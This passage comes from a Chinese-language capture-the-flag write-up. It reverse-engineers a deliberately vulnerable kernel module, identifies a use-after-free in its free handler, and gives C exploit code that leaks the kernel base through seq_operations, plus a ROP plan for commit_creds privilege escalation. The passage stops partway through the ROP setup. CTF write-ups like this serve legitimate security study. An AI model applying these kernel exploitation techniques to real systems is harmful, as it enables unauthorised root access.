+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, 18h</span><br><span class="line">mov     rsi, r8</span><br><span class="line">lea     rdi, [rbp-40h]</span><br><span class="line">call    _copy_from_user ; PIC mode</span><br><span class="line">test    rax, rax</span><br><span class="line">jnz     loc_2EF</span><br></pre></td></tr></table></figure>
+
+<p>成功進到這條<br>他會檢查傳入的第一個是不是小於 0x20<br>並且第一個傳入會是 rax</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, [rbp-40h]</span><br><span class="line">cmp     eax, 20h ; &#x27; &#x27;</span><br><span class="line">ja      short loc_196</span><br></pre></td></tr></table></figure>
+
+<p>之後會進到這裡，他會去 addrList 搜 pointer<br>可以推得 rbp - 0x40 上的是 index<br>r12 存了分配 chunk address</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, eax</span><br><span class="line">mov     r12, ds:addrList[rax*8]</span><br><span class="line">test    r12, r12</span><br><span class="line">jz      short loc_196</span><br></pre></td></tr></table></figure>
+
+<p>之後做<br>把 args 第二個項目給 r13<br>第三個項目是 r14</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     r13, [rbp-38h]</span><br><span class="line">mov     r14, [rbp-30h]</span><br><span class="line">cmp     r13, 7FFFFFFFh</span><br><span class="line">ja      loc_2FB</span><br></pre></td></tr></table></figure>
+
+<p>如果成功進到這條<br>傳入到 <code>void __check_object_size(const void *ptr, unsigned long n, bool to_user);</code><br>這裡 rdi 是 r12 是 chunk pointer<br>rsi 是 r13 是要檢查的 object 大小，所以可以知道第二個是 size</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xor     edx, edx</span><br><span class="line">mov     rsi, r13</span><br><span class="line">mov     rdi, r12</span><br><span class="line">call    __check_object_size ; PIC mode</span><br><span class="line">mov     rdx, r13</span><br><span class="line">mov     rsi, r14</span><br><span class="line">mov     rdi, r12</span><br><span class="line">call    _copy_from_user ; PIC mode</span><br><span class="line">xor     eax, eax</span><br><span class="line">jmp     loc_198</span><br></pre></td></tr></table></figure>
+
+<p>之後去 copy userspace 的東西到 kernel (r12 這裡是 chunk pointer)<br>r14 是第三個項目，這裡是 userspace buffer pointer</p>
+<p>這裡可以看出，他是 edit chunk<br>傳入的 args 結構是 (順便說第一個 show 結構跟這個一樣)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">args</span>&#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> index;</span><br><span class="line">	<span class="type">uint64_t</span> size;</span><br><span class="line">	<span class="type">void</span> *buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="alloc-ioctlcode-0x20"><a href="#alloc-ioctlcode-0x20" class="headerlink" title="alloc (ioctlcode &#x3D;&#x3D; 0x20)"></a>alloc (ioctlcode &#x3D;&#x3D; 0x20)</h3><p>esi 是 ioctlcode，他會比較是不是 0x20</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ja      short loc_1B8</span><br><span class="line"></span><br><span class="line">cmp     esi, 20h ; &#x27; &#x27;</span><br><span class="line">jz      loc_226</span><br></pre></td></tr></table></figure>
+
+<p>rdx 是 0x10<br>r8 是 args<br>rdi 是 kernel space stack，把 args copy 進來<br>注意一下，這裡只 copy 了 0x10，與先前的不一樣</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">loc_226:</span><br><span class="line">mov     edx, 10h</span><br><span class="line">mov     rsi, r8</span><br><span class="line">lea     rdi, [rbp-40h]</span><br><span class="line">call    _copy_from_user ; PIC mode</span><br><span class="line">test    rax, rax</span><br><span class="line">jnz     loc_2EF</span><br></pre></td></tr></table></figure>
+
+<p>rbp - 0x40 是第一個參數<br>並比較是不是小於 0x20 (size 不可以大於 0x20)<br>是就繼續往下走<br>這裡的 rdi 也會放在 kmalloc size 位，esi 是第二個參數，是 kmalloc 分配的 flags，rax 是 kmalloc 回傳值，會給 rbx<br>所以這裡第一個參數是 size</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov     rdi, [rbp-40h]</span><br><span class="line">cmp     rdi, 20h ; &#x27; &#x27;</span><br><span class="line">ja      loc_196</span><br><span class="line"></span><br><span class="line">mov     esi, 0CC0h</span><br><span class="line">call    __kmalloc       ; PIC mode</span><br><span class="line">mov     rbx, rax</span><br><span class="line">test    rax, rax</span><br><span class="line">jz      loc_196</span><br></pre></td></tr></table></figure>
+
+<p>r12 是第一個參數<br>r13 是第二個參數</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     r12, [rbp-40h]</span><br><span class="line">mov     r13, [rbp-38h]</span><br><span class="line">cmp     r12, 7FFFFFFFh</span><br><span class="line">ja      loc_2FB</span><br></pre></td></tr></table></figure>
+
+<p>r12 是 size 已經確定了<br>rax 是 kmalloc chunk pointer<br>r13 是從 userspace copy 的 pointer<br>並把他 copy 到 chunk pointer</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xor     edx, edx</span><br><span class="line">mov     rsi, r12</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    __check_object_size ; PIC mode</span><br><span class="line">mov     rdx, r12</span><br><span class="line">mov     rsi, r13</span><br><span class="line">mov     rdi, rbx</span><br><span class="line">call    _copy_from_user ; PIC mode</span><br><span class="line">test    rax, rax</span><br><span class="line">jz      short loc_2AC</span><br></pre></td></tr></table></figure>
+<p>省略一下，這裡的 index 是從 0 開始往上加的<br>最後他會把 pointer 丟進 addrList</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     ds:addrList[rdx*8], rbx</span><br><span class="line">xor     eax, eax</span><br><span class="line">jmp     loc_198</span><br></pre></td></tr></table></figure>
+
+<p>綜上就可以看出這是一個 malloc，並且第一次順便賦值給 chunk pointer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">args</span>&#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> size;</span><br><span class="line">	<span class="type">void</span> *buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="free-ioctlcode-0x30"><a href="#free-ioctlcode-0x30" class="headerlink" title="free (ioctlcode &#x3D;&#x3D; 0x30)"></a>free (ioctlcode &#x3D;&#x3D; 0x30)</h3><p>這部分不用看組語，直接看 IDA 反編譯結果</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !copy_from_user(&amp;v12, v2, <span class="number">8LL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v12 &lt;= <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addrList[(<span class="type">unsigned</span> <span class="type">int</span>)v12] )</span><br><span class="line">      kfree();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-22LL</span>;</span><br></pre></td></tr></table></figure>
+<p>他會 copy 8 bytes<br>這 8 bytes 是 index<br>最後把對應的 chunk pointer free 掉<br>這裡傳入的結構就是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">args</span>&#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>這裡有個問題，就是沒有清空原本存在 addrList 的 pointer<br>導致有 UAF 產生</p>
+<h2 id="腳本架構"><a href="#腳本架構" class="headerlink" title="腳本架構"></a>腳本架構</h2><p>先把互動腳本寫完</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_IOCTL 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KFREE_IOCTL 0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHOW_IOCTL 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_IOCTL 0x50</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd_dev;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">	<span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kfree_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> index;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edit_show_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> index;</span><br><span class="line">	<span class="type">uint64_t</span> size;</span><br><span class="line">	<span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_kmalloc</span><span class="params">(<span class="type">uint64_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.size = size;</span><br><span class="line">    n.buf = buf;</span><br><span class="line">    ioctl(fd_dev, KMALLOC_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_kfree</span><span class="params">(<span class="type">uint64_t</span> index)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kfree_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.index = index;</span><br><span class="line">    ioctl(fd_dev, KFREE_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_show</span><span class="params">(<span class="type">uint64_t</span> index, <span class="type">uint64_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">edit_show_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.index = index;</span><br><span class="line">    n.size = size;</span><br><span class="line">    n.buf = buf;</span><br><span class="line">    ioctl(fd_dev, SHOW_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_edit</span><span class="params">(<span class="type">uint64_t</span> index, <span class="type">uint64_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">edit_show_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.index = index;</span><br><span class="line">    n.size = size;</span><br><span class="line">    n.buf = buf;</span><br><span class="line">    ioctl(fd_dev, EDIT_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    bind_cpu(<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> fd_dev = open(<span class="string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd_dev &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to open device !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>先 leak kernel base<br>先 kmalloc 一塊 0x20 大小的 chunk，他會從 memory pool kmalloc-32 中拿出一塊 object 來用<br>之後把他 free 掉<br>這樣就會有一個 addrList 中有指向已經被 free 掉的 pointer 了<br>接下來去 open <code>/proc/self/stat</code><br>他會從 kmalloc-32 拿出一塊分配給 seq_operation</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">  <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">  <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">  <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">  <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>他是一個 vtable，上面有許多 kernel function pointer<br>通過他可以用來 leak kernel base</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_IOCTL 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KFREE_IOCTL 0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHOW_IOCTL 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_IOCTL 0x50</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd_dev;</span><br><span class="line"><span class="type">uint64_t</span> kernelbase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">	<span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kfree_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> index;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edit_show_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> index;</span><br><span class="line">	<span class="type">uint64_t</span> size;</span><br><span class="line">	<span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_kmalloc</span><span class="params">(<span class="type">uint64_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.size = size;</span><br><span class="line">    n.buf = buf;</span><br><span class="line">    ioctl(fd_dev, KMALLOC_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_kfree</span><span class="params">(<span class="type">uint64_t</span> index)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kfree_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.index = index;</span><br><span class="line">    ioctl(fd_dev, KFREE_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_show</span><span class="params">(<span class="type">uint64_t</span> index, <span class="type">uint64_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">edit_show_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.index = index;</span><br><span class="line">    n.size = size;</span><br><span class="line">    n.buf = buf;</span><br><span class="line">    ioctl(fd_dev, SHOW_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">io_edit</span><span class="params">(<span class="type">uint64_t</span> index, <span class="type">uint64_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">edit_show_args</span> <span class="title">n</span>;</span></span><br><span class="line">    n.index = index;</span><br><span class="line">    n.size = size;</span><br><span class="line">    n.buf = buf;</span><br><span class="line">    ioctl(fd_dev, EDIT_IOCTL, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> buf1[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    bind_cpu(<span class="number">0</span>);</span><br><span class="line">    fd_dev = open(<span class="string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd_dev &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to open device !\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Success open /dev/kerpwn\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Start leak kernel address \n&quot;</span>);</span><br><span class="line">    io_kmalloc(<span class="number">0x20</span>, buf1); <span class="comment">// index 0</span></span><br><span class="line">    io_kfree(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd_seq = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    io_show(<span class="number">0</span>, <span class="number">0x20</span>, buf1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel address : 0x%lx\n&quot;</span>, buf1[<span class="number">0</span>]);</span><br><span class="line">    kernelbase = buf1[<span class="number">0</span>] - <span class="number">0x319d30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel base : 0x%lx\n&quot;</span>, kernelbase);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下來來找一些 gadget 來用<br>我們打算通過 commits_cred(init_cred()); 提權<br>這邊構造</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi</span><br><span class="line">init_cred</span><br><span class="line">commits_cred</span><br><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure>
+
+<p>之後去算 offset 看 rsp 要搬多少</p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.19/source/fs/seq_file.c#L171">https://elixir.bootlin.com/linux/v5.19/source/fs/seq_file.c#L171</a><br>當我們去修改 seq_operations 的 start<br>他會去 call rax 時，上面原本的 pointer 被你改成了 0xaabbccdd<br>所以會 crash，代表我們控制到 RIP </p>
+<img src="/2025/05/14/XHLJ-2021-easykernel-writeup/a.png" class="">
+
+<p>另外可以看到 rsp+0x198 上長這樣<br>代表上面是我們寫上去的 gadget<br>只要把 rsp 搬到這就可以執行 ROP</p>
+<img src="/2025/05/14/XHLJ-2021-easykernel-writeup/b.png" class="">
+
+<p>如果用這條 gadget<br><code> add rsp, 0x190; pop rbx; pop r12; pop rbp; ret;</code></p>
+<p>他會剛好落在 r14 跑 ROP<br>所以從 r14 開始寫 ROP gadget</p>
+<p>另外我們要跳上去 <code>swapgs_restore_regs_and_return_to_usermode</code><br>需要 stack 有 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dummy</span><br><span class="line">dummy</span><br><span class="line">rip</span><br><span class="line">cs</span><br><span class="line">rflag</span><br><span class="line">rsp</span><br><span class="line">ss</span><br></pre></td></tr></table></figure>
+
